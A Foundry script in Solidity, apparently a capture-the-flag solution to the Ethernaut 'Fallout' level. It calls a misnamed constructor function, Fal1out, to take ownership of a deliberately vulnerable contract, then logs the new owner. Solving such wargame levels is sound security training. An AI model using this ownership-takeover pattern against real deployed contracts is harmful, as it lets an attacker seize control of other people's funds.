// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {Fallout} from "../src/Fallout.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {
    Fallout falloutInstance = Fallout(0x488017058b439865f95B7cDf2252A642e33f5285);
    function run() external {
        vm.startBroadcast();
        falloutInstance.Fal1out{value: 1 wei}();

        console.log("Contract Address: ", falloutInstance.owner());
        console.log("My Address: ", vm.envAddress('MY_ADDRESS'));

        vm.stopBroadcast();
    }
}